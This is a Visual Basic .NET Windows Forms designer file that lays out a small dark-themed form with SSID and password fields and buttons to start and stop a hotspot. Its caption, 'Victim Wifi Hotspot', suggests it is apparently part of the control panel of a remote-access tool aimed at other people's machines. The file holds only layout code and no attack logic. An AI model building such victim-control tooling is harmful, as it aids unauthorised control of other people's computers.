<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class hotspot
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.SkyDarkForm1 = New X_Theme.SkyDarkForm()
        Me.SkyDarkButton1 = New X_Theme.SkyDarkButton()
        Me.SkyDarkButton2 = New X_Theme.SkyDarkButton()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.key = New System.Windows.Forms.RichTextBox()
        Me.ssid = New System.Windows.Forms.RichTextBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.SkyDarkForm1.SuspendLayout()
        Me.SuspendLayout()
        '
        'SkyDarkForm1
        '
        Me.SkyDarkForm1.BackColor = System.Drawing.Color.FromArgb(CType(CType(62, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(58, Byte), Integer))
        Me.SkyDarkForm1.Controls.Add(Me.Label4)
        Me.SkyDarkForm1.Controls.Add(Me.Label3)
        Me.SkyDarkForm1.Controls.Add(Me.Label2)
        Me.SkyDarkForm1.Controls.Add(Me.Label1)
        Me.SkyDarkForm1.Controls.Add(Me.key)
        Me.SkyDarkForm1.Controls.Add(Me.ssid)
        Me.SkyDarkForm1.Controls.Add(Me.SkyDarkButton2)
        Me.SkyDarkForm1.Controls.Add(Me.SkyDarkButton1)
        Me.SkyDarkForm1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.SkyDarkForm1.Location = New System.Drawing.Point(0, 0)
        Me.SkyDarkForm1.Name = "SkyDarkForm1"
        Me.SkyDarkForm1.Size = New System.Drawing.Size(276, 150)
        Me.SkyDarkForm1.TabIndex = 0
        Me.SkyDarkForm1.Text = "Victim Wifi Hotspot"
        '
        'SkyDarkButton1
        '
        Me.SkyDarkButton1.Location = New System.Drawing.Point(81, 96)
        Me.SkyDarkButton1.Name = "SkyDarkButton1"
        Me.SkyDarkButton1.Size = New System.Drawing.Size(83, 23)
        Me.SkyDarkButton1.TabIndex = 2
        Me.SkyDarkButton1.Text = "Start Hotspot"
        '
        'SkyDarkButton2
        '
        Me.SkyDarkButton2.Location = New System.Drawing.Point(168, 96)
        Me.SkyDarkButton2.Name = "SkyDarkButton2"
        Me.SkyDarkButton2.Size = New System.Drawing.Size(75, 23)
        Me.SkyDarkButton2.TabIndex = 3
        Me.SkyDarkButton2.Text = "Stop Hotspot"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.BackColor = System.Drawing.Color.Transparent
        Me.Label2.ForeColor = System.Drawing.Color.Lime
        Me.Label2.Location = New System.Drawing.Point(4, 64)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(56, 13)
        Me.Label2.TabIndex = 42
        Me.Label2.Text = "Password "
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.BackColor = System.Drawing.Color.Transparent
        Me.Label1.ForeColor = System.Drawing.Color.Lime
        Me.Label1.Location = New System.Drawing.Point(4, 32)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(71, 13)
        Me.Label1.TabIndex = 41
        Me.Label1.Text = "Hotspot SSID"
        '
        'key
        '
        Me.key.BackColor = System.Drawing.Color.FromArgb(CType(CType(62, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(58, Byte), Integer))
        Me.key.Font = New System.Drawing.Font("Consolas", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.key.ForeColor = System.Drawing.Color.Lime
        Me.key.Location = New System.Drawing.Point(81, 60)
        Me.key.Name = "key"
        Me.key.Size = New System.Drawing.Size(162, 28)
        Me.key.TabIndex = 40
        Me.key.Text = ""
        '
        'ssid
        '
        Me.ssid.BackColor = System.Drawing.Color.FromArgb(CType(CType(62, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(58, Byte), Integer))
        Me.ssid.Font = New System.Drawing.Font("Consolas", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ssid.ForeColor = System.Drawing.Color.Lime
        Me.ssid.Location = New System.Drawing.Point(81, 26)
        Me.ssid.Name = "ssid"
        Me.ssid.Size = New System.Drawing.Size(162, 28)
        Me.ssid.TabIndex = 39
        Me.ssid.Text = ""
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.BackColor = System.Drawing.Color.Transparent
        Me.Label3.ForeColor = System.Drawing.Color.Lime
        Me.Label3.Location = New System.Drawing.Point(4, 128)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(82, 13)
        Me.Label3.TabIndex = 43
        Me.Label3.Text = "Hotspot status:"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.BackColor = System.Drawing.Color.Transparent
        Me.Label4.ForeColor = System.Drawing.Color.Lime
        Me.Label4.Location = New System.Drawing.Point(92, 128)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(27, 13)
        Me.Label4.TabIndex = 44
        Me.Label4.Text = "....."
        '
        'hotspot
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(276, 150)
        Me.Controls.Add(Me.SkyDarkForm1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Name = "hotspot"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "hotspot"
        Me.SkyDarkForm1.ResumeLayout(False)
        Me.SkyDarkForm1.PerformLayout()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents SkyDarkForm1 As X_Theme.SkyDarkForm
    Friend WithEvents SkyDarkButton2 As X_Theme.SkyDarkButton
    Friend WithEvents SkyDarkButton1 As X_Theme.SkyDarkButton
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents key As System.Windows.Forms.RichTextBox
    Friend WithEvents ssid As System.Windows.Forms.RichTextBox
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents Label4 As System.Windows.Forms.Label
End Class
